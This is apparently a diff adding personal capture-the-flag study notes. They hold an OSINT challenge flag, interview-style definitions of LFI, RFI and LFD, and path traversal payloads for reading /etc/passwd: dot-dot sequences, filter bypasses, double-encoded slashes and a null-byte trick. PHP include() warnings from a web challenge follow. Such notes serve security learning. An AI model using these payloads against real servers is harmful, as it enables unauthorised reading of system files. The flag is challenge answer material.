@@ -1,0 +1,44 @@
+
+
+McCaffrey
+
+TH / THA
+rockstar_games
+{max_payne_25-7-2001_james_perry_14-10-2003_rockstar_15-05-2012_mark_wahlberg_17-10-2008_@KevinHart4real_beyond_bread_ekkamai_TH}
+
+OSINT{max_payne_25-7-2001_james_perry_14-10-2003_rockstar_15-05-2012_mark_wahlberg_17-10-2008_@KevinHart4real_beyond_bread_ekkamai_TH}
+
+# Path Traversal 
+## Interview diff btw LFI , LFD
+
+LFI -> Local File Inclusion -> read and excute the file ( file upload shell and excute it)
+RFI -> Remote File Inclusion -> if paramter is allowed to access some external resources then i inject my server inside of it 
+LFD -> local file disclosure -> ability to read senstive file like etc/passwd
+
+
+../../../../../etc/passwd
+/etc/passwd
+....//....//....//....//etc/passwd
+
+#double encode for /
+..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd
+
+# null byte terminates the path before .jpg 
+../../../../etc/passwd%00.jpg
+
+
+
+
+
+
+
+%25%32%66
+
+Warning: include(): open_basedir restriction in effect. File(../.inc.php) is not within the allowed path(s): (/challenge/web-serveur/ch45:/tmp) in /challenge/web-serveur/ch45/index.php on line 7
+
+Warning: include(../.inc.php): failed to open stream: Operation not permitted in /challenge/web-serveur/ch45/index.php on line 7
+
+Warning: include(): Failed opening '../.inc.php' for inclusion (include_path='.:/usr/share/php') in /challenge/web-serveur/ch45/index.php on line 7
+include('/' . '.inc.php');  →  include('/.inc.php');
+
+
